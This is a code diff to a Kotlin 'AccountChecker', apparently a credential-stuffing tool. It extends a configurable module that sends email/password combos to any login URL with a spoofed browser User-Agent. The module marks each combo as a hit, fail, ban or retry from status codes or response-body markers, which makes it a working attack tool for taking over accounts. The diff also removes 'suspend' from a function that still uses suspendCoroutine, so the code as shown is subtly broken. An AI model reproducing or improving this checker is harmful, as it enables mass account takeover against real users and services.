@@ -445,34 +445,82 @@ class AccountChecker(private val config: CheckConfig) {
         })
     }
 
-    private suspend fun checkCustom(combo: Combo): Account = suspendCoroutine { cont ->
-        val formBody = FormBody.Builder()
-            .add("email", combo.email)
-            .add("password", combo.password)
-            .build()
+    private fun checkCustom(combo: Combo): Account = suspendCoroutine { cont ->
+        val url = config.customUrl.ifBlank { CheckModule.CUSTOM.endpoint }
+        if (url.isEmpty()) {
+            cont.resume(createResult(combo, AccountStatus.ERROR, "Custom module needs a URL"))
+            return@suspendCoroutine
+        }
+        try {
+            val method = config.customMethod.uppercase()
+            val content = config.customBodyTemplate
+                .replace("{email}", combo.email)
+                .replace("{password}", combo.password)
 
-        val request = Request.Builder()
-            .url(config.module.endpoint)
-            .post(formBody)
-            .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-            .build()
+            val builder = Request.Builder()
+                .url(url)
+                .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
 
-        getOkHttpClient().newCall(request).enqueue(object : Callback {
-            override fun onFailure(call: Call, e: IOException) {
-                cont.resume(createResult(combo, AccountStatus.ERROR, e.message ?: "Connection failed"))
+            when (method) {
+                "GET" -> builder.get()
+                "PUT" -> builder.put(
+                    content.toRequestBody(config.customContentType.ifBlank { "application/json" }.toMediaType())
+                )
+                "PATCH" -> builder.patch(
+                    content.toRequestBody(config.customContentType.ifBlank { "application/json" }.toMediaType())
+                )
+                "DELETE" -> builder.delete(
+                    content.toRequestBody(config.customContentType.ifBlank { "application/json" }.toMediaType())
+                )
+                else -> builder.post(
+                    content.toRequestBody(config.customContentType.ifBlank { "application/json" }.toMediaType())
+                )
             }
 
-            override fun onResponse(call: Call, response: Response) {
-                response.close()
-                val status = when (response.code) {
-                    200 -> AccountStatus.HIT
-                    401, 403 -> AccountStatus.FAIL
-                    429 -> AccountStatus.BAN
-                    else -> AccountStatus.ERROR
+            getOkHttpClient().newCall(builder.build()).enqueue(object : Callback {
+                override fun onFailure(call: Call, e: IOException) {
+                    cont.resume(createResult(combo, AccountStatus.ERROR, e.message ?: "Connection failed"))
                 }
-                cont.resume(createResult(combo, status, "HTTP ${response.code}"))
-            }
-        })
+
+                override fun onResponse(call: Call, response: Response) {
+                    val bodyStr = response.body?.string() ?: ""
+                    response.close()
+
+                    val hasSuccess = config.customSuccessMarker.isNotBlank() && bodyStr.contains(config.customSuccessMarker)
+                    val hasFail = config.customFailMarker.isNotBlank() && bodyStr.contains(config.customFailMarker)
+                    val markersConfigured = config.customSuccessMarker.isNotBlank() || config.customFailMarker.isNotBlank()
+
+                    val status = when {
+                        hasSuccess -> AccountStatus.HIT
+                        hasFail -> AccountStatus.FAIL
+                        markersConfigured -> AccountStatus.FAIL
+                        response.code == 200 || response.code == 201 || response.code == 204 -> AccountStatus.HIT
+                        response.code == 401 || response.code == 403 -> AccountStatus.FAIL
+                        response.code == 429 -> AccountStatus.BAN
+                        response.code == 500 || response.code == 502 || response.code == 503 -> AccountStatus.RETRY
+                        else -> AccountStatus.ERROR
+                    }
+
+                    val details = when (status) {
+                        AccountStatus.HIT -> if (config.customSuccessMarker.isNotBlank()) {
+                            "Marker: ${config.customSuccessMarker}"
+                        } else {
+                            "HTTP ${response.code}"
+                        }
+                        AccountStatus.FAIL -> if (config.customFailMarker.isNotBlank()) {
+                            "Marker: ${config.customFailMarker}"
+                        } else {
+                            "HTTP ${response.code}"
+                        }
+                        else -> "HTTP ${response.code}"
+                    }
+
+                    cont.resume(createResult(combo, status, details))
+                }
+            })
+        } catch (e: Exception) {
+            cont.resume(createResult(combo, AccountStatus.ERROR, "Bad config: ${e.message}"))
+        }
     }
 
     private fun createResult(combo: Combo, status: AccountStatus, details: String): Account {
